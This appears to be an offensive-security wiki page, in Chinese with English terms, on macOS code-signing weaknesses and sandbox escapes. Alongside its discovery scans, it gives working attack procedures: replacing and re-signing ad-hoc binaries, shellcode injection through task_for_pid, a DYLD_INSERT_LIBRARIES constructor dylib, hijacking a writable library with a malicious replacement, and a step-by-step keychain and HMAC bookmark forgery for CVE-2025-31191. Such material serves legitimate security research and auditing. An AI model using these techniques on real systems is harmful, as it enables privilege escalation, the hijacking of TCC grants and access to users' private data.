# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`) 创建的 code signature **没有 certificate chain**。它仍会对已签名的 code 进行哈希处理，因此 validation 可以检测到修改，但不会提供其他 component 可以进行 authentication 的 developer identity。替换并重新签名 executable 会生成不同的 CodeDirectory/CDHash。<sup>[[1]](#references)[[4]](#references)</sup>

在 Apple Silicon Macs 上，所有 executable 至少都需要 ad-hoc signature。这意味着你会在许多 development tools、Homebrew packages 和 third-party utilities 中发现 ad-hoc signatures。

### Why This Matters

- **没有可验证的 signer identity** — 仅接受 path、ad-hoc status 或未固定 identifier 的检查，无法确定是谁生成了该 binary。
- 位于**特权位置**（FDA、daemons、helpers）的 third-party ad-hoc binaries，如果其 file 或 parent directory 可写，则属于 high-priority targets。
- CDHash、designated-requirement 或基于 requirement 的 TCC check **确实会注意到替换**。基于 path 的 policy 可能不会；请检查实际的 requirement，并重新测试 grant，不要假设重新签名后 grant 仍然有效。

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### 攻击：Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## 可调试进程（get-task-allow）

### 基本信息

**`com.apple.security.get-task-allow`** entitlement（或 `CS_GET_TASK_ALLOW` flag）允许经过授权的 debugger 获取进程 task port，即使 Hardened Runtime 通常会阻止此操作。成功的 debugger 可以读取内存、修改寄存器、注入 code 并控制执行流程。<sup>[[3]](#references)</sup>

此 entitlement **仅用于 development builds**。但是，一些第三方 binaries 会在 production 中携带此 entitlement。

> [!CAUTION]
> 带有 `get-task-allow` 的 production binary 是一种强大的 exploitation primitive。`taskgated`、caller identity、sandboxing、debugger entitlements 以及 Developer Tools authorization 仍会影响特定 client 是否能够获取 task port；请同时使用 `lldb`/`debugserver` 和预期的 injector 进行测试。一旦 attachment 成功，注入的 code 将以 target 的 entitlements、TCC grants 和 security context 运行。

### 发现
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 攻击：Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Runtime Library-Validation Clearing

私有 entitlement **`com.apple.private.security.clear-library-validation`** 不会在进程启动时禁用 library validation。相反，它允许进程在运行时对自身调用 `csops(..., CS_OPS_CLEAR_LV, ...)`。如果调用者拥有该 entitlement 并满足 handler 的其他检查条件，XNU 随后会清除 `CS_REQUIRE_LV | CS_FORCED_LV`。因此，进程可能只有在执行到清除 library validation 的代码路径后，才会成为可行的 library-injection 目标。<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

当一个 binary 同时具有以下两个 entitlement 时：<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation`（加载任意 dylib）
- `com.apple.security.cs.allow-dyld-environment-variables`（接受 DYLD 环境变量）

这是一个高价值的 code-injection 组合，因为 Hardened Runtime 允许同时使用不受信任的 library 和 DYLD 环境变量。不过，launch context 仍可能清除 DYLD 变量（例如受保护或特权执行路径），因此应验证确切的调用方式，而不是将这对 entitlement 视为无条件有效。

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 攻击：DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox Temporary Exceptions

### How They Weaken the Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) punch holes in the App Sandbox:<sup>[[2]](#references)</sup>

| Exception | What It Allows |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 连接系统范围的 XPC/Mach 服务 |
| `temporary-exception.files.absolute-path.read-write` | 读写 app container 外部的文件 |
| `temporary-exception.iokit-user-client-class` | 打开 IOKit user-client 连接 |
| `temporary-exception.shared-preference.read-only` | 读取其他 app 的偏好设置 |
| `temporary-exception.files.home-relative-path.read-write` | 访问相对于 `~` 的路径 |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

最危险的 exception 是 **mach-lookup** ——它允许 sandboxed app 与 privileged daemons 通信：
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### 攻击：Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks Are Not XPC Client Integrity

XPC service 可以通过从其 audit token 中提取 code-signing 状态，并接受 Apple **platform binary** 或携带 `CS_REQUIRE_LV`/`CS_FORCED_LV` 的客户端来验证连接。这些测试描述的是可执行文件和选定的进程标志；它们无法证明当前 address space 中只包含受信任的代码。针对 ImageCapture services 的研究表明，可注入的 Apple binary（例如 `/bin/ls`）可以通过 `DYLD_INSERT_LIBRARIES` 加载攻击者 dylib，然后以 platform client 身份连接。随后针对 library-validation flags 的检查也被绕过，之后 Apple 才在 macOS 15 中修改该 service，要求其具备私有 authorization entitlement。<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Reverse `listener:shouldAcceptNewConnection:`（或等效的 low-level XPC handler），并识别仅基于 `isPlatformBinary`、`kSecCodeInfoFlags`、`CS_PLATFORM_BINARY`、`CS_REQUIRE_LV` 或 `CS_FORCED_LV` 作出决策的逻辑。
2. 枚举能够使用该 protocol 通信的 Apple-signed clients，然后检查 Hardened Runtime 和 entitlements。仅有 platform signature 并不能证明 DYLD injection 已被阻止。
3. 在**目标 macOS build**上测试候选对象。如果 constructor dylib 成功加载，则从该 constructor 发起 service connection，使 audit token 属于被接受的 platform process。
4. 重新测试每个 vendor patch：向相同的 authorization decision 中添加另一个可变的 process-status flag，可能无法消除 confused-deputy primitive。
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD 行为、AMFI policy 和 service-side checks 会因 macOS 版本而异。针对完全修补的主机失败，并不能证明相同 chain 在存在漏洞的版本上也会失败。

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks 会在应用重新启动后持久化用户的文件选择。sandbox extension 与启动过程绑定，因此 `ScopedBookmarkAgent` 会对其进行验证，并创建一个经过 HMAC 身份验证的长期 bookmark；当应用之后提交该 bookmark 时，agent 会对其进行验证并签发一个新的 sandbox extension。签名 secret 存储在 login keychain 中，并使用 bundle identifier 派生出 per-app key。<sup>[[7]](#references)</sup>

在受影响的系统上，keychain ACL 阻止了不受信任的进程**读取** `com.apple.scopedbookmarksagent.xpc` secret，但没有阻止删除。遭入侵的 sandboxed app 可以使用已知 secret 和由 attacker 控制的 ACL 替换该 item，派生出 app-specific HMAC key，在可写的 container bookmark plist 中伪造 entries，并请求 `ScopedBookmarkAgent` 将其交换为 file-access extensions。这使任何使用 security-scoped bookmarks 的 sandboxed application 都可能在无需额外 file-picker interaction 的情况下实现 arbitrary-file-access sandbox escape。Apple 已在 2025 年 3 月 31 日的 security updates 中修复该问题。<sup>[[7]](#references)</sup>

### Triage and Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
在 vulnerable host 上的 exploitation sequence 如下：

1. 在使用 persistent scoped bookmarks 的 sandboxed app 中获得 code execution。
2. 将 agent 的 keychain signing item 替换为已知 secret，并设置 permissive ACL。
3. 计算 `HMAC-SHA256(key=known_secret, data=bundle_id)`，并为 app 的 writable bookmark store 中的有用路径伪造 bookmark。
4. 触发应用程序正常的 bookmark-resolution 路径，使 `ScopedBookmarkAgent` 返回 sandbox extension。
5. 使用新的 file access，覆盖该用户可用的 sandbox 外 execution 或 data target。

这是一个 **patched-version technique**：使用它来理解 trust boundary 并评估未打补丁的系统，不要将其视为当前 releases 的假设。对于当前 testing，应重点关注 bookmark parsing、identity binding、keychain-item lifecycle，以及 agent 周围的 confused-deputy behavior。

---

## Private Apple Entitlements

### What They Are

以 `com.apple.private.*` 为前缀的 entitlements 提供对 **Apple-internal APIs** 的访问权限；这些 API 没有文档说明，第三方开发者也无法使用。带有 private entitlements 的第三方 binaries 通常通过 enterprise cert、MDM 或 non-App-Store distribution 获得。

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | 完整的 TCC database read/write |
| `com.apple.private.tcc.allow` | 访问特定的 TCC services |
| `com.apple.private.security.no-sandbox` | 在没有 sandbox 的情况下运行 |
| `com.apple.private.iokit` | 直接访问 IOKit drivers |
| `com.apple.private.kernel.\*` | 访问 kernel interface |
| `com.apple.private.xpc.launchd.job-label` | 注册/管理 launchd jobs |
| `com.apple.rootless.install` | 写入 SIP-protected paths |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles（SBPL）

### 它们是什么

二进制文件可以附带使用 SBPL（Seatbelt Profile Language）编写的 **Custom Sandbox Profiles**。这些 profiles 可能比默认的 App Sandbox 限制更严格，也可能 **更加宽松**。

### Auditing Custom Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 可写的库路径

### 它们是什么

当二进制文件从当前用户可以**写入**的路径加载动态库时，该库可能会被替换为恶意代码。

### 发现
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### 攻击：Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — 代码签名指南](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h`（`CS_OPS_*` 操作和 `CLEAR_LV_ENTITLEMENT`）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c`（`csops` / `CS_OPS_CLEAR_LV` 处理程序）](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [macOS Sandbox Escapes 的新时代：深入研究被忽视的攻击面并发现 10 多个新漏洞](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [CVE-2025-31191 分析：基于 macOS security-scoped bookmarks 的 sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
